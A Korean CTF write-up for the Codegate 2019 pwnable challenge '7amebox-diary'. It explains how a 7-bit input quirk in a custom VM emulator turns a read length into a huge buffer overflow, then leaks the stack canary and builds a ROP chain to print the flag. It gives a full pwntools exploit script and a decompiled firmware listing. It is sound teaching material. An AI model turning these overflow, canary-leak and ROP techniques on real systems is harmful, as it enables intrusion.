+++
title = "Codegate CTF 2019 - 7amebox-diary"
date = "2024-07-30"
description = "Codegate CTF 2019 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "vm", "improper check", "bof", "rop"]
+++

## 0x00. Introduction
역시 기본적인 구조는 [7amebox-name](../Codegate-CTF-2019-Quals-7amebox-name/)과 동일하다.

``` bash
➜  ls -al
total 64
drwxr-xr-x  2 user user  4096 Jul 30 08:48 .
drwxr-x--- 24 user user  4096 Jul 30 08:49 ..
-rw-r--r--  1 user user   527 Jul 17 03:04 Dockerfile
-rwxr-xr-x  1 user user 30804 Jul 17 03:02 _7amebox_patched.py
-rw-r--r--  1 user user  4560 Jul 17 03:02 diary.firm
-rw-r--r--  1 user user    41 Jul 17 03:03 flag
-rwxr-xr-x  1 user user    22 Jul 17 03:02 run.sh
-rwxr-xr-x  1 user user   323 Jul 17 03:02 vm_diary.py
```

### Structure
``` c
struct diary {
    char title[30];
    char contents[1200];
    char dummpy[30];
    char key[1200];
};
```

### Concept
```c
void main() {
    int choice;
    int canary;

    print(string_0x6c3);
    print("1) list\n2) write\n3) show\n4) edit\n5) quit\n>");
    read(choice, 3);

    while(1) {
        if(choice == '1')
            list_0x12e();
        else if(choice == '2')
            write_0x1f0();
        else if(choice == '3')
            show_0x319();
        else if(choice == '4')
            edit_0x452();
        else if(choice == '5')
            exit_0x23();
    }
}
```

`diary` 구조체를 `write`를 이용해서 생성하고 `list` 및 `show`로 출력, `edit`으로 수정할 수 있는 firmware이다.


## 0x01. Vulnerability
`7amebox-name`보다 firmware 사이즈가 많이 커져서 일단 C로 포팅을 했는데 아무리 봐도 취약점이 없었다.
그래서 emulator쪽 코드를 다시 보다보니 이런 코드가 있었다.

``` python
class Stdin:
    def read(self, size):
        res = ''
        buf = sys.stdin.readline(size)
        for ch in buf:
            if ord(ch) > 0b1111111:
                break
            if ch == '\n':
                res += ch
                break
            res += ch
        return res

    def write(self, data):
        return None
```

1byte가 7bit인 환경이기 때문에 0x80보다 큰 값을 입력받으면 입력이 끊기고 return한다.
별거 아닌 것 같지만 이러면 `write`를 할 때 큰 취약점이 발생한다.

```
   0x286:  10 5b           mov r5, bp     
   0x288:  2e 50 06 00 00  sub r5, 0x6    
   0x28d:  00 65           ldr r6, [r5] ; r6 = [r5]
   0x28f:  26 60 1e 00 00  add r6, 0x1e   
   0x294:  12 10 30 00 09  mov r1, 0x4b0  
   0x299:  10 06           mov r0, r6     
   0x29b:  7b 50 6f 00 06  call read_0x60f ; read(memory + 30, 1200);
   0x2a0:  48 00           dec r0         
   0x2a2:  10 5b           mov r5, bp     
   0x2a4:  2e 50 06 00 00  sub r5, 0x6    
   0x2a9:  00 65           ldr r6, [r5] ; r6 = [r5]
   0x2ab:  26 60 1e 00 00  add r6, 0x1e   
   0x2b0:  24 60           add r6, r0     
   0x2b2:  0d 76           strb ('zero', [{'r6'}]) ; [r6] = zero
   0x2b4:  10 5b           mov r5, bp     
   0x2b6:  2e 50 06 00 00  sub r5, 0x6    
   0x2bb:  00 65           ldr r6, [r5] ; r6 = [r5]
   0x2bd:  26 60 6c 00 09  add r6, 0x4ec  
   0x2c2:  10 10           mov r1, r0     
   0x2c4:  10 06           mov r0, r6     
   0x2c6:  7b 50 44 00 06  call read_0x60f ; read(memory + 1260, r0)
```

`write`는 `title` -> `contents` -> `key` 순서로 입력을 받는데 `contents`와 `key`를 xor해서 저장하기 때문에 `contents`와 `key`를 같은 길이로 입력해야한다.

Assembly에서 보면 `contents`를 입력받는 `0x29b`에서 결과값인 `r0`의 값을 가지고 바로 `key`를 입력받을 길이를 결정하게 된다.

이 과정에서 마지막 `\n`을 없애주기 위해 `0x2a0`에서 `dec r0`를 수행하는데, `Stdin`에 0x80보다 큰 값을 줘서 `r0`를 0으로 만들면 `key`를 입력받을 길이가 -1이 되어버린다.

``` bash
r0 : 0x3
r1 : 0x0
r2 : 0xc44ec
r3 : -0x1
r4 : 0x0
r5 : 0xf5fc5
r6 : 0xc44ec
r7 : 0xc4000
r8 : 0x3
r9 : 0x18ed55
r10 : 0x59000
bp : 0xf5fcb
sp : 0xf5fb6
pc : 0x625
eflags : 0x1
zero : 0x0
PC : 20 00           syscall
```

그러면 이 syscall이 어떻게 처리되는지 확인해야하는데,

``` python
    def sys_s3(self):   # read
        fd = self.register.get_register('r1')
        buf = self.register.get_register('r2')
        size = self.register.get_register('r3')

        if 0 <= fd < len(self.pipeline):
            res = self.pipeline[fd].read(size)
            data = map(ord, res)   # Stdin.read(size)
            self.write_memory(buf, data, len(data))
            self.register.set_register('r0', len(data) & 0b111111111111111111111)
        else:
            self.register.set_register('r0', 0)
```

다행히 size가 0보다 작은 경우를 처리하지 않기 때문에 `0b111111111111111111111`만큼 입력을 받는 엄청난 overflow가 발생하게 된다.

``` python
    def write_memory(self, addr, data, length):
        if not length:
            return

        if self.memory.check_permission(addr, PERM_WRITE) and self.memory.check_permission(addr + length - 1, PERM_WRITE):
            for offset in range(length):
                self.memory[addr + offset] = data[offset] & 0b1111111
        else:
            self.terminate("[VM] Can't write memory")
```

또한 `write_memory`에서 메모리를 쓰기 시작하는 page와 끝나는 page의 권한만 확인하기 때문에 중간 page들에 권한이 없더라도 쓰기가 가능하다.


## 0x02. Exploit
### Canary Leak
```
   0x587:  10 5b           mov r5, bp     
   0x589:  2e 50 03 00 00  sub r5, 0x3    
   0x58e:  00 65           ldr r6, [r5] ; r6 = [r5]
   0x590:  5c 69           cmp r6, r9     
   0x592:  73 50 06 00 00  je pc + 0x6 ; jne if A == B ; not FLAG_ZF
   0x597:  11 4b           mov sp, bp     
   0x599:  1d 30           pop bp         
   0x59b:  1d 50           pop pc

stack_chk_fail_0x59d:         
   0x59d:  12 00 04 00 13  mov r0, 0x984  
   0x5a2:  7b 50 3a 00 01  call print_0x661
   0x5a7:  54 00           xor r0, r0     
   0x5a9:  20 00           syscall        
```

모든 함수의 끝에서 `r9`에 저장해놓은 값과 `[bp-0x3]`에 저장된 값을 비교하는 stack 보호 기법이 있다.

따라서 이 값을 leak해야하는데, 0x59003에 `canary`가 저장된 주소를 쓸 수 있다면 `list`에서 leak이 가능할 것 같았다.

``` c
char *load_diary(int i) {
    int *r10 = 0x59000;
    return *(r10 + i * 3);
}

void list_0x12e() {
    char tmp[3];
    int i = 1;
    int canary;
    ...
        print(load_diary_0x6b4(i));
        print('\n');
    ...
}         
```

문제는 말하자면 전역변수 공간인 `0x59000`보다 앞에 있는 주소에 `diary`를 할당받아야 overwrite가 가능한데, 새로운 메모리를 할당해주는 로직은 다음과 같다.

``` python
    def allocate(self, new_perm, addr=None):
        if addr:
            if not (self.get_perm(addr) & PERM_MAPPED):
                self.set_perm(addr, (PERM_MAPPED | new_perm) & 0b1111)
                return addr
            else:
                return -1

        for page, perm in self.pages.items():
            if not (self.get_perm(page) & PERM_MAPPED):
                self.set_perm(page, (PERM_MAPPED | new_perm) & 0b1111)
                return page
        return -1
```

할당받을 주소를 전달하지 않으면 `for page, perm in self.pages.items()`를 통해서 `pages`를 순회하며 mapping이 되지 않은 공간을 return해준다.
이 때 python 2.7 버전에서는 dictionary를 랜덤한 순서로 순회하므로 `0x59000`보다 낮은 공간이 할당될 때까지 `write`를 하면 된다.

`allocate`에 후킹을 걸어서 할당된 메모리를 출력해본 결과 다행히 두번째만에 `0x59000`보다 낮은 공간이 할당되었다.

``` bash
addr : 0xc4000
new perm : 0b1110
addr : 0x1c000
new perm : 0b1110
```

따라서 할당받은 `0x1c000`의 `key` 주소로부터 `diary_ptr`이 저장되는 `0x59003`까지의 offset을 계산해서 다음과 같이 payload를 작성하면 leak이 가능하다.

``` python
    write(s, b"AAAA", b"aaaa", b"1111")     # 0xc4000
    payload = b"b" * (data_addr - (0x1c000 + 0x4ec))
    payload += p21(1)
    payload += p21(canary_addr)
    write(s, b"BBBB", b"\xff", payload)     # 0x1c000
    
    r = (list(s))
    canary = u21(r.split(b"1)")[1][:3])
    log.info(f"canary : {hex(canary)}")
```

### Stack Overflow
이제 `canary`를 포함해서 stack의 return address를 덮으면 `pc` 컨트롤이 가능하다.

다만 `read_0x60f`를 호출해서 입력을 받는데 이 함수에도 `canary`가 있으므로 이를 유의해서 payload를 작성해야 한다.

``` python
    payload = b"c" * (read_canary_addr - (0x3a000 + 0x4ec))
    payload += p21(canary)                  # canary of read_0x60f
    payload += b"flag\x00\x00"
    payload += p21(canary)                  # canary of write_0x1f0
```


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from gameboxlib import *
from time import sleep
import sys

BINARY = "./vm_diary.py"
key_addr = 0x1c000 + 0x4ec
data_addr = 0x59000
ret_addr = 0xf5fce
canary_addr = 0xf5fc8
read_canary_addr = 0xf5fb6

bp = {
    'list' : 0x12e,
    'end_of_list' : 0x1ee,
}
context.terminal = ['tmux', 'splitw', '-hf']

def set_bp(s, addr):
    print(s.recv())
    s.sendline(f"b {hex(addr)}".encode())
    sleep(0.1)
    s.sendline(b"c")
    return s.recv()

def list(s):
    s.sendline(b"1")
    sleep(0.1)
    return s.recv()

def write(s, title, contents, key):
    s.sendline(b"2")
    s.recvuntil(b"title>")
    s.sendline(title)
    s.recvuntil(b">")
    s.sendline(contents)
    s.sendline(key)
    return s.recv()

def main():
    if(len(sys.argv) > 1):
        s = remote("localhost", int(sys.argv[1]))
    else:
        s = process(BINARY)
    # print(set_bp(s, bp['end_of_list']))
    s.recv()

    write(s, b"AAAA", b"aaaa", b"1111")     # 0xc4000
    payload = b"b" * (data_addr - (0x1c000 + 0x4ec))
    payload += p21(1)
    payload += p21(canary_addr)
    write(s, b"BBBB", b"\xff", payload)     # 0x1c000
    
    r = (list(s))
    canary = u21(r.split(b"1)")[1][:3])
    log.info(f"canary : {hex(canary)}")

    payload = b"c" * (read_canary_addr - (0x3a000 + 0x4ec))
    payload += p21(canary)
    payload += b"flag\x00\x00"
    payload += p21(canary)
    # open("flag") => r0 = 1, r1 = "flag"
    payload += p21(0x609)                   # ret
    payload += p21(read_canary_addr + 3)    # pop r1
    payload += p21(0x1)                     # pop r0
    payload += p21(0x625)                   # pop pc ; syscall
    # read(2, 0x3a000, 0x40) => r0 = 3, r1 = 2, r2 = 0x3a000, r3 = 0x40
    payload += p21(canary)                  # pop r6
    payload += p21(0x28)                    # pop r3
    payload += p21(0x3a000)                 # pop r2
    payload += p21(0x2)                     # pop r1
    payload += p21(0x60b)                   # pop pc ; pop r0
    payload += p21(0x3)                     # pop r0
    payload += p21(0x625)                   # pop pc ; syscall
    # write(1, 0x3a000, 0x40) => r0 = 2, r1 = 1, r2 = 0x3a000, r3 = 0x40
    payload += p21(canary)                  # pop r6
    payload += p21(0x28)                    # pop r3
    payload += p21(0x3a000)                 # pop r2
    payload += p21(0x1)                     # pop r1
    payload += p21(0x60b)                   # pop pc ; pop r0
    payload += p21(0x2)                     # pop r0
    payload += p21(0x625)                   # pop pc ; syscall
    print(write(s, b"CCCC", b"\xff", payload))     # 0x3a000

if __name__=='__main__':
    main()
```


## 0x04. Decompile
``` c
#define O_MAPPED 0b1000
#define O_READ   0b0100
#define O_WRITE  0b0010
#define O_EXEC   0b0001
char *string_0x6c3 = "====================================================\
              |                   SECRET_DIARY                   |\
              ====================================================\
              |                   ___________                    |\
              |                  |     _     |                   |\
              |                  |    (_)    |                   |\
              |                  |   |   |   |                   |\
              |                  |   |___|   |                   |\
              |                  |___________|                   |\
              ----------------------------------------------------";

int count_0x59000 = 0;
struct diary *diary_ptr_0x59003[9];

struct diary {
    char title[30];
    char contents[1200];
    char dummpy[30];
    char key[1200];
};

char *load_diary(int i) {
    int *r10 = 0x59000;
    return *(r10 + i * 3);
}

void list_0x12e() {
    char tmp[3];
    int i = 1;
    int canary;

    print("YOUR DIARY");
    print("----------------------------------------------------");
    for(i=1; i<count_0x59000; i++) {
        tmp[0] = i + 0x30;      // '1'
        tmp[1] = 0x29;          // ')'
        print(tmp);

        print(load_diary_0x6b4(i));
        print('\n');
    }
    print("----------------------------------------------------");

    stack_chk_fail();
    return;
}         

void write_0x1f0() {
    struct diary *diary;
    int canary;
    int r0, r8;

    if(count_0x59000 > 9) {
        print("no you can't. (max : 9)");
        goto _0x303;
    }
    count_0x59000++;

    diary = mprotect(O_READ | O_WRITE);
    diary_ptr_0x59003[count_0x59000] = diary;

    print("title>");
    r0 = read(diary, 30);
    diary->title[r0] = "\x00";

    print("content, secret key (same length)\n>");
    r0 = read(diary->contents, 1200);
    diary->contents[r0] = "\x00";

    read(diary->key, r0);   // read(diary->key, 0x7f7f7f);

    for(r8=0; r8<1200; r8++)
        diary->contents[r8] = diary->contents[r8] ^ diary->key[r8];
_0x303:
    stack_chk_fail();
    return;
}

void show_0x319() {
    char buf[1200];         // 0xf5b12
    struct diary *diary;    // 0xf5fc2
    int choice;             // 0xf5fc5
    int canary;             // 0xf5fc8
    int r0, r8;

    print("index>>");
    read(choice, 3);
    if(choice < '1' || choice > '9')
        goto _0x43c;
    
    r0 = choice - '0';
    if(r0 > count_0x59000)
        goto _0x43c;

    diary = load_diary_0x6b4(r0);
    print("----------------------------------------------------");
    print("TITLE :");
    print(diary->title);
    print("\n");
    print("----------------------------------------------------");

    memcpy_0x5d9(buf, diary->contents, 1200);

    for(r8=0; r8<1200; r8++)
        buf[r8] = buf[r8] ^ diary->key[r8];
    
    print(buf);
    print("\n");
    print("----------------------------------------------------");

_0x43c:
    stack_chk_fail();
    return;
}

void edit_0x452() {
    struct diary *diary;
    int choice;
    int canary;
    int r0, r8;

    print("index>>");
    read(choice, 3);
    if(choice < '1' || choice > '9')
        goto _0x587;

    r0 = choice - '0';
    if(r0 > count_0x59000)
        goto _0x587;

    diary = load_diary_0x6b4(r0);
    print("title>");
    read(diary->title, 30);
    diary->title[r0] = "\x00";

    print("content\n>");
    r0 = read(diary->contents, 1200);
    diary->contents[r0] = "\x00";

    print("secret key\n>");
    print(diary->key);
    print("\n");
    
    for(r8=0; r8<1200; r8++)
        diary->contents[r8] = diary->contents[r8] ^ diary->key[r8];

_0x587:
    stack_chk_fail();
    return;
}


void exit_0x23() {
    _exit();
}

void main() {
    int choice;
    int canary;

    print(string_0x6c3);
    print("1) list2) write3) show4) edit5) quit");
    read(choice, 3);

    while(1) {
        if(choice == '1')
            list_0x12e();
        else if(choice == '2')
            write_0x1f0();
        else if(choice == '3')
            show_0x319();
        else if(choice == '4')
            edit_0x452();
        else if(choice == '5')
            exit_0x23();
    }
}
```